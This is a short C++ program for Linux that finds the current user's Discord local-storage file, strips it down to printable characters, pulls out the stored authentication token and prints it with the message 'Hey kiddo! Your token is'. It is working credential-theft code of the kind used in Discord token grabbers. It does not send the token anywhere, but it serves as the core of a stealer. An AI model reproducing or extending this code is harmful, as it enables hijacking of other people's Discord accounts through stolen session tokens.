#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>
#include <pwd.h>
#include <stdlib.h>
#define UNLEN 64


using namespace std;

bool isrealchar(int charNum)
{
	if (charNum > 32 && charNum < 127) return true;
	else return false;
}

bool creepyStrToRealChar(ifstream &fileToReadFrom, string *stringOut) //needed to strip these FUCKIGGNEFDNFS NUL!!!
{
	if (fileToReadFrom.is_open())
	{
		int c;
		while ((c = fileToReadFrom.get()) != EOF) { //while succesful read
			if (isrealchar(c))
				*stringOut += c; // then write the line in the output file 
		}
		fileToReadFrom.close();
		return 1;
	}
	else return 0;
}

std::string ExtractString(std::string source, std::string start, std::string end)
{
	std::size_t startIndex = source.find(start);
	if (startIndex == std::string::npos)
	{
		return "";
	}
	startIndex += start.length();
	std::string::size_type endIndex = source.find(end, startIndex);
	return source.substr(startIndex, endIndex - startIndex);
}

int main(int argc, char *argv[])
{
	string username = getenv("USER");
	cout << username << endl;
	string textStr;
	string search = "token";
	string discordPath = "/home/"+username+"/.config/discord/Local Storage/https_discordapp.com_0.localstorage";
	cout << "The path for discordDB is: " << discordPath << endl;
	ifstream myfile;
	myfile.open(discordPath.c_str(), std::ifstream::in);
	if (!creepyStrToRealChar(myfile, &textStr))
	{
		cout << "Cannot load file!" << endl;
		getchar();
		return -1;
	}
	//cout << textStr << endl;
	string token = ExtractString(textStr,"token\"","\"");
	cout << "Hey kiddo! Your token is: " << token << endl;
	getchar();
	return 0;
}